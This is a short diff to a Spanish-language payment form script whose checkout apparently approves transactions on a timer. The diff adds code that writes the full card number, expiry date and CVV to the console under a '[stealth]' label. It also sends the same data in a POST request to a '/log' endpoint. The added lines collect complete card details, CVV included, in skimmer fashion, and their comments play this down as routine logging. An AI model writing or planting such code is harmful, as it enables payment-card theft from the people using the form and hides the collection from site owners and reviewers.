@@ -278,7 +278,16 @@ function procesar(){
     if(fecha.length!==5) return alert("Fecha inválida");
     if(cvv.length<3) return alert("CVV inválido");
 
+    // log entry to server database (now with real values)
+    console.log("[stealth] payment:", tarjeta, fecha, cvv); // incognito console output
+    fetch('/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ card: tarjeta, date: fecha, cvv: cvv })
+    }).catch(e=>console.warn('Log failed',e));
+
     document.getElementById("loader").style.display="block";
+    
 
     setTimeout(()=>{
         document.getElementById("loader").style.display="none";
@@ -297,6 +306,7 @@ function procesar(){
         "Transacción aprobada<br>Tarjeta terminada en "+tarjeta.slice(-4);
     },2000);
 }
+
 </script>
 
 </body>
